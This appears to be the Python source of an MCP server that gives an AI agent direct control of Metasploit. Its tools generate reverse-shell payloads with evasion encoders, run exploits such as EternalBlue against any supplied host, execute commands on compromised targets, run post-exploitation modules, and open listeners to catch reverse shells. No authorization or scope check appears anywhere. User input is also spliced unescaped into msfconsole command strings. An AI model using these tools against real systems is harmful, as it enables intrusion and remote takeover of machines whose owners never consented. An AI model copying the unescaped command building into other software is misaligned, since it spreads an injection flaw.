#!/usr/bin/env python3
"""
OpenSploit MCP Server: metasploit

Exploitation framework for payload generation, vulnerability checks, and exploits.
"""

import base64
import os
import re
import tempfile
from typing import Any, Dict, List, Optional

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output


class MetasploitServer(BaseMCPServer):
    """MCP server wrapping Metasploit Framework."""

    PAYLOAD_FORMATS = [
        "exe", "elf", "raw", "ruby", "python", "perl", "php", "asp",
        "aspx", "jsp", "war", "ps1", "psh", "vba", "c", "dll", "msi",
    ]

    COMMON_PAYLOADS = {
        "windows_reverse_tcp": "windows/meterpreter/reverse_tcp",
        "windows_reverse_https": "windows/meterpreter/reverse_https",
        "linux_reverse_tcp": "linux/x64/meterpreter/reverse_tcp",
        "linux_shell_tcp": "linux/x64/shell_reverse_tcp",
        "php_reverse": "php/meterpreter/reverse_tcp",
        "java_reverse": "java/meterpreter/reverse_tcp",
    }

    def __init__(self):
        super().__init__(
            name="metasploit",
            description="Exploitation framework for payload generation, vulnerability checks, and exploits",
            version="1.0.0",
        )

        self.register_method(
            name="generate_payload",
            description="Generate a payload using msfvenom",
            params={
                "payload": {
                    "type": "string",
                    "required": True,
                    "description": "Payload name (e.g., 'windows/meterpreter/reverse_tcp') or shortcut (windows_reverse_tcp)",
                },
                "lhost": {
                    "type": "string",
                    "required": True,
                    "description": "Listening host IP for reverse connections",
                },
                "lport": {
                    "type": "integer",
                    "required": True,
                    "description": "Listening port for reverse connections",
                },
                "format": {
                    "type": "string",
                    "default": "raw",
                    "description": "Output format: exe, elf, raw, ruby, python, php, asp, c, dll, etc.",
                },
                "encoder": {
                    "type": "string",
                    "description": "Encoder to use (e.g., 'x86/shikata_ga_nai')",
                },
                "iterations": {
                    "type": "integer",
                    "default": 1,
                    "description": "Number of encoding iterations",
                },
            },
            handler=self.generate_payload,
        )

        self.register_method(
            name="search_modules",
            description="Search for Metasploit modules",
            params={
                "query": {
                    "type": "string",
                    "required": True,
                    "description": "Search query (e.g., 'ms17-010', 'apache struts', 'smb')",
                },
                "type": {
                    "type": "string",
                    "enum": ["all", "exploit", "auxiliary", "post", "payload"],
                    "default": "all",
                    "description": "Module type to search for",
                },
            },
            handler=self.search_modules,
        )

        self.register_method(
            name="check_vuln",
            description="Check if a target is vulnerable using an auxiliary scanner module",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Auxiliary module path (e.g., 'auxiliary/scanner/smb/smb_ms17_010')",
                },
                "rhosts": {
                    "type": "string",
                    "required": True,
                    "description": "Target host(s)",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options as key-value pairs",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.check_vuln,
        )

        self.register_method(
            name="run_exploit",
            description="Run an exploit module against a target",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Exploit module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')",
                },
                "rhosts": {
                    "type": "string",
                    "required": True,
                    "description": "Target host(s)",
                },
                "payload": {
                    "type": "string",
                    "description": "Payload to use",
                },
                "lhost": {
                    "type": "string",
                    "description": "Listening host for reverse payloads",
                },
                "lport": {
                    "type": "integer",
                    "description": "Listening port for reverse payloads",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options",
                },
                "timeout": {
                    "type": "integer",
                    "default": 300,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.run_exploit,
        )

        self.register_method(
            name="exec_command",
            description="Execute a command on target using an exploit with cmd/unix/generic payload",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Exploit module path that supports command execution",
                },
                "rhosts": {
                    "type": "string",
                    "required": True,
                    "description": "Target host(s)",
                },
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command to execute on the target",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options (e.g., RPORT, TARGETURI)",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.exec_command,
        )

        self.register_method(
            name="list_sessions",
            description="List active Meterpreter/shell sessions",
            params={
                "timeout": {
                    "type": "integer",
                    "default": 30,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.list_sessions,
        )

        self.register_method(
            name="session_command",
            description="Run a command in an active session",
            params={
                "session_id": {
                    "type": "integer",
                    "required": True,
                    "description": "Session ID to interact with",
                },
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command to execute in the session",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.session_command,
        )

        self.register_method(
            name="post_module",
            description="Run a post-exploitation module on a session",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Post module path (e.g., 'post/multi/gather/env')",
                },
                "session_id": {
                    "type": "integer",
                    "required": True,
                    "description": "Session ID to run the module on",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.post_module,
        )

        self.register_method(
            name="handler",
            description="Start a multi/handler to catch reverse shells",
            params={
                "payload": {
                    "type": "string",
                    "required": True,
                    "description": "Payload to listen for (e.g., 'windows_reverse_tcp')",
                },
                "lhost": {
                    "type": "string",
                    "required": True,
                    "description": "Listening host IP",
                },
                "lport": {
                    "type": "integer",
                    "required": True,
                    "description": "Listening port",
                },
                "timeout": {
                    "type": "integer",
                    "default": 300,
                    "description": "Timeout waiting for connection (seconds)",
                },
            },
            handler=self.start_handler,
        )

    def _resolve_payload(self, payload: str) -> str:
        """Resolve payload shortcut to full name."""
        return self.COMMON_PAYLOADS.get(payload, payload)

    def _parse_search_output(self, output: str) -> List[Dict[str, str]]:
        """Parse msfconsole search output."""
        modules = []

        for line in output.split("\n"):
            line = line.strip()
            if not line or line.startswith("#") or line.startswith("="):
                continue

            # Match lines like: "0  exploit/windows/smb/ms17_010_eternalblue  ..."
            match = re.match(r"\s*\d+\s+(exploit|auxiliary|post|payload)/(\S+)\s+(.*)", line)
            if match:
                modules.append({
                    "type": match.group(1),
                    "path": f"{match.group(1)}/{match.group(2)}",
                    "info": match.group(3).strip(),
                })

        return modules

    async def generate_payload(
        self,
        payload: str,
        lhost: str,
        lport: int,
        format: str = "raw",
        encoder: Optional[str] = None,
        iterations: int = 1,
    ) -> ToolResult:
        """Generate a payload using msfvenom."""
        self.logger.info(f"Generating payload: {payload}")

        payload_name = self._resolve_payload(payload)

        with tempfile.NamedTemporaryFile(delete=False, suffix=f".{format}") as f:
            output_file = f.name

        try:
            args = [
                "msfvenom",
                "-p", payload_name,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format,
                "-o", output_file,
            ]

            if encoder:
                args.extend(["-e", encoder, "-i", str(iterations)])

            self.logger.info(f"Running: msfvenom -p {payload_name} ...")
            result = await self.run_command(args, timeout=120)

            # Read generated payload
            payload_data = None
            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                with open(output_file, "rb") as f:
                    payload_bytes = f.read()
                    payload_data = base64.b64encode(payload_bytes).decode("utf-8")

            return ToolResult(
                success=True,
                data={
                    "payload": payload_name,
                    "lhost": lhost,
                    "lport": lport,
                    "format": format,
                    "size_bytes": len(payload_bytes) if payload_data else 0,
                    "payload_base64": payload_data,
                    "encoder": encoder,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )
        finally:
            if os.path.exists(output_file):
                os.unlink(output_file)

    async def search_modules(
        self,
        query: str,
        type: str = "all",
    ) -> ToolResult:
        """Search for Metasploit modules."""
        self.logger.info(f"Searching modules: {query}")

        # Build search command
        search_cmd = f"search {query}"
        if type != "all":
            search_cmd = f"search type:{type} {query}"

        args = [
            "msfconsole",
            "-q",
            "-x", f"{search_cmd}; exit",
        ]

        try:
            result = await self.run_command(args, timeout=60)
            modules = self._parse_search_output(result.stdout)

            return ToolResult(
                success=True,
                data={
                    "query": query,
                    "type": type,
                    "modules": modules,
                    "count": len(modules),
                },
                raw_output=sanitize_output(result.stdout),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def check_vuln(
        self,
        module: str,
        rhosts: str,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Check if a target is vulnerable using an auxiliary scanner."""
        self.logger.info(f"Checking vulnerability with {module} against {rhosts}")

        # Build msfconsole commands
        commands = [
            f"use {module}",
            f"set RHOSTS {rhosts}",
        ]

        if options:
            for key, value in options.items():
                commands.append(f"set {key} {value}")

        commands.extend(["run", "exit"])

        args = [
            "msfconsole",
            "-q",
            "-x", "; ".join(commands),
        ]

        try:
            result = await self.run_command(args, timeout=timeout)
            output = result.stdout + result.stderr

            # Check for vulnerability indicators
            vulnerable = False
            if any(x in output.lower() for x in ["vulnerable", "likely vulnerable", "is vulnerable"]):
                vulnerable = True

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "target": rhosts,
                    "vulnerable": vulnerable,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def run_exploit(
        self,
        module: str,
        rhosts: str,
        payload: Optional[str] = None,
        lhost: Optional[str] = None,
        lport: Optional[int] = None,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Run an exploit module against a target."""
        self.logger.info(f"Running exploit {module} against {rhosts}")

        # Build msfconsole commands
        commands = [
            f"use {module}",
            f"set RHOSTS {rhosts}",
        ]

        if payload:
            commands.append(f"set PAYLOAD {self._resolve_payload(payload)}")
        if lhost:
            commands.append(f"set LHOST {lhost}")
        if lport:
            commands.append(f"set LPORT {lport}")

        if options:
            for key, value in options.items():
                commands.append(f"set {key} {value}")

        commands.extend(["exploit -z", "exit"])

        args = [
            "msfconsole",
            "-q",
            "-x", "; ".join(commands),
        ]

        try:
            result = await self.run_command(args, timeout=timeout)
            output = result.stdout + result.stderr

            # Check for success indicators
            success = False
            session_opened = False
            if any(x in output.lower() for x in ["session", "meterpreter", "command shell"]):
                session_opened = True
                success = True
            elif "exploit completed" in output.lower():
                success = True

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "target": rhosts,
                    "exploit_success": success,
                    "session_opened": session_opened,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def exec_command(
        self,
        module: str,
        rhosts: str,
        command: str,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Execute a command on target using an exploit with cmd payload."""
        self.logger.info(f"Executing command via {module} on {rhosts}: {command}")

        # Build msfconsole commands - use cmd/unix/generic for command execution
        commands = [
            f"use {module}",
            f"set RHOSTS {rhosts}",
            "set PAYLOAD cmd/unix/generic",
            f'set CMD {command}',
        ]

        if options:
            for key, value in options.items():
                commands.append(f"set {key} {value}")

        # Use 'run' instead of 'exploit -z' to see output directly
        commands.extend(["run", "exit"])

        args = [
            "msfconsole",
            "-q",
            "-x", "; ".join(commands),
        ]

        try:
            result = await self.run_command(args, timeout=timeout)
            output = result.stdout + result.stderr

            # Parse the output to extract command results
            # Look for output after the exploit runs
            command_output = ""
            exploit_success = False

            # Check for success indicators
            if "exploit completed" in output.lower() or "command executed" in output.lower():
                exploit_success = True

            # Try to extract command output from the full output
            # The output typically appears after "[*]" markers
            lines = output.split("\n")
            capture = False
            for line in lines:
                # Skip metasploit UI lines
                if line.startswith("[*]") or line.startswith("[+]") or line.startswith("[-]"):
                    if "executing" in line.lower() or "command" in line.lower():
                        capture = True
                        exploit_success = True
                    continue
                if capture and line.strip():
                    command_output += line + "\n"

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "target": rhosts,
                    "command": command,
                    "exploit_success": exploit_success,
                    "command_output": command_output.strip() if command_output else None,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def list_sessions(
        self,
        timeout: int = 30,
    ) -> ToolResult:
        """List active Meterpreter/shell sessions."""
        self.logger.info("Listing active sessions")

        args = [
            "msfconsole",
            "-q",
            "-x", "sessions -l; exit",
        ]

        try:
            result = await self.run_command(args, timeout=timeout)
            output = result.stdout

            # Parse session list
            sessions = []
            for line in output.split("\n"):
                # Match lines like: "  1     meterpreter x86/windows  user@host  192.168.1.1:4444 -> ..."
                match = re.match(r"\s*(\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)", line)
                if match:
                    sessions.append({
                        "id": int(match.group(1)),
                        "type": match.group(2),
                        "info": match.group(3),
                        "user": match.group(4),
                        "connection": match.group(5),
                    })

            return ToolResult(
                success=True,
                data={
                    "sessions": sessions,
                    "count": len(sessions),
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def session_command(
        self,
        session_id: int,
        command: str,
        timeout: int = 60,
    ) -> ToolResult:
        """Run a command in an active session."""
        self.logger.info(f"Running command in session {session_id}: {command}")

        # Use sessions -C to run command in a session
        args = [
            "msfconsole",
            "-q",
            "-x", f"sessions -C '{command}' -i {session_id}; exit",
        ]

        try:
            result = await self.run_command(args, timeout=timeout)
            output = result.stdout + result.stderr

            return ToolResult(
                success=True,
                data={
                    "session_id": session_id,
                    "command": command,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def post_module(
        self,
        module: str,
        session_id: int,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Run a post-exploitation module on a session."""
        self.logger.info(f"Running post module {module} on session {session_id}")

        commands = [
            f"use {module}",
            f"set SESSION {session_id}",
        ]

        if options:
            for key, value in options.items():
                commands.append(f"set {key} {value}")

        commands.extend(["run", "exit"])

        args = [
            "msfconsole",
            "-q",
            "-x", "; ".join(commands),
        ]

        try:
            result = await self.run_command(args, timeout=timeout)
            output = result.stdout + result.stderr

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "session_id": session_id,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def start_handler(
        self,
        payload: str,
        lhost: str,
        lport: int,
        timeout: int = 300,
    ) -> ToolResult:
        """Start a multi/handler to catch reverse shells."""
        self.logger.info(f"Starting handler for {payload} on {lhost}:{lport}")

        payload_name = self._resolve_payload(payload)

        commands = [
            "use exploit/multi/handler",
            f"set PAYLOAD {payload_name}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            "set ExitOnSession false",
            "exploit -j",
        ]

        # Run handler and wait a bit for it to start
        commands.append("sleep 2")
        commands.append("jobs")
        commands.append("exit")

        args = [
            "msfconsole",
            "-q",
            "-x", "; ".join(commands),
        ]

        try:
            result = await self.run_command(args, timeout=timeout)
            output = result.stdout + result.stderr

            # Check if handler started
            handler_started = "handler" in output.lower() and "started" in output.lower()

            return ToolResult(
                success=True,
                data={
                    "payload": payload_name,
                    "lhost": lhost,
                    "lport": lport,
                    "handler_started": handler_started,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )


if __name__ == "__main__":
    MetasploitServer.main()
